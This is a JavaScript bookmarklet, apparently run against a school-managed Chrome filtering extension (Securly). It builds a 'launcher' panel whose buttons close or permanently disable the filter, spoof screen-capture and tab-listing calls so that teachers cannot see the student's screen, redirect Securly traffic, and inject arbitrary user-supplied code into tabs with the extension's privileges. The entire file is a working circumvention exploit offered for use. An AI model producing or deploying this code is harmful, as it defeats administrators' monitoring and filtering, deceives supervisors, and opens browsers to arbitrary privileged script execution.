javascript: (document = window.document),
  document.write(
    "<html>          <body>       <center><head>     <h1>[Point Blank Swap Launcher]</h1><center><h1>---Disabling---</h1></center>\n<center><button id='soft'>Soft Disable</button></center><center><button id='hard'>Hard Kill</button></center><center><button id='reload'>Reload Blocker</button></center><center><center><h1> ---Scripts--- </h1></center><center><button id='hide'>Hide tabs</button><button id='cool'>Create cool looking window</button></center><center><h3> Custom Notification </h3> </center> <input id='title' placeholder='Put title here'><input id='messer' placeholder='Put message here'><button id='notification'>Show Notification</button></center><center><button id='dns'>DNS emulator</button><center></center><center><center><center><h3>Run scripts as background </h3></center><textarea  id='code' placeholder='Put Code Here'></textarea></center><center><button id='google'>Run on google</button><button id='when'>When you click your extension</button></center><center></center> </body>\n          </html>\n <style> textarea{border-radius: 25px; margin: 1 auto;margin-center: auto;margin-center: auto; text-align: center; align: center; display:inline-block;height:400px}*{box-sizing:border-box}body{padding:13px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}input {border-radius: 12px; color:#000;font-size:15px} textarea {border-radius: 21px; color:#000;font-size:15px} button,pre { border-radius: 12px; color:#000;font-size:15px}h1,h2,h3,h4,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{ border-radiusfont-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:25px; padding:13px 17px;border:none}button,input{background-color:#fff;padding:13px 100px;margin:20 5px 5px 0}input{width:600px;border-radius:25px}textarea{white-space:pre;float:center;width:60%;border-radius:25px; 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:25; 10px 10px 0;padding:13px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none; cursor:pointer;transition:filter 250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}</style>\n"
  ),
  document.getElementById("hide").addEventListener(
    "click",
    function () {
      alert(
        "This will open a window, which your teacher will only be able to see the window this opens, so open another one after this one opens"
      ),
        (opener.chrome.tabs.captureVisibleTabAsync =
          opener.chrome.tabs.captureVisibleTabAsync || screenshot_old);
      opener.chrome.windows.getAllAsync =
        opener.chrome.windows.getAllAsync || get_tabs_old;
      clearInterval(spoof_int);
      if (spoof_int) alert("Your teacher can't see your screen now!");
      spoof_int = null;
      `
            : `;
      var spoof_int,
        visible_id = 0,
        screenshot_old =
          screenshot_old || opener.chrome.tabs.captureVisibleTabAsync,
        get_tabs_old = get_tabs_old || opener.chrome.windows.getAllAsync,
        get_tabs_new = function () {
          return new Promise((resolve, reject) => {
            get_tabs_old({
              populate: true,
              windowTypes: ["normal"],
            }).then((tabs) => {
              tabs.forEach((tab) => {
                if (tab.id === visible_id) resolve([tab]);
              });
            });
          });
        };
      opener.chrome.windows.create({ url: "https://google.com" }, (win) => {
        visible_id = win.id;
        spoof_int = setInterval(() => {
          opener.chrome.windows.getLastFocused((window) => {
            var visible = window.id === visible_id;
            opener.chrome.tabs.captureVisibleTabAsync = visible
              ? screenshot_old
              : null;
            opener.chrome.windows.getAllAsync = visible ? get_tabs_new : null;
          });
        }, 5);
      });
    },
    !1
  ),
  document.getElementById("cool").addEventListener(
    "click",
    function () {
      opener.chrome.windows.create({
        url: "https://www.google.com",
        type: "popup",
      });
    },
    !1
  ),
  document.getElementById("dns").addEventListener(
    "click",
    function () {
     opener.chrome.webRequest.onBeforeRequest.addListener(
  () => {
    return { redirectUrl: "javascript:" };
  },
  {
    urls: ["*://*.securly.com/*"],
  },
  ["blocking"]
);

    },
    !1
  ),
  document.getElementById("notification").addEventListener(
    "click",
    function () {
      opener.chrome.notifications.create(null, {
        type: "basic",
        iconUrl:
          "https://upload.wikimedia.org/wikipedia/en/9/9a/Trollface_non-free.png",
        title: "" + document.getElementById("title").value,
        message: "" + document.getElementById("messer").value,
      });
    },
    !1
  ),
  document.getElementById("google").addEventListener(
    "click",
    function () {
      alert("Go to google.com to see your code");
      javascript:(function(){opener.chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status == "complete" && tab.url.includes('google.com')) {
    opener.chrome.tabs.executeScript(
      tabId, { code: `
      ` + document.getElementById("code").value
             }
    );
  }
})})()
    },
    !1
  ),
  document.getElementById("hard").addEventListener(
    "click",
    function () {
      javascript: (localStorage.cluster =
        "UNKNOWN_SCHOOL," +
        (confirm("This will disable your blocker until the removal of your account, if you want something less permanent use soft disable, continue?")
          ? 99999999999999
          : 0)),
        opener.chrome.extension.getBackgroundPage().location.reload();
    },
    !1
  ),
  document.getElementById("reload").addEventListener(
    "click",
    function () {
      localStorage.cluster = "UNKNOWN_SCHOOL,0";
      opener.chrome.runtime.reload();
    },
    !1
  ),
  document.getElementById("soft").addEventListener(
    "click",
    function () {
  document.getElementById("soft").innerHTML = "Disabled";
      opener.chrome.extension.getBackgroundPage().close();
    },
    !1
  ),
  document.getElementById("when").addEventListener(
    "click",
    function () {
      opener.chrome.browserAction.onClicked.addListener(() => {
        opener.chrome.tabs.query(
          { active: true, currentWindow: true },
          (tab) => {
            opener.chrome.tabs.executeScript(tab[0].id, {
              code:
                `
      ` + document.getElementById("code").value,
              matchAboutBlank: true,
            });
          }
        );
      });
      alert("Everytime you click your extension, your code will show");
    },
    !1
  );
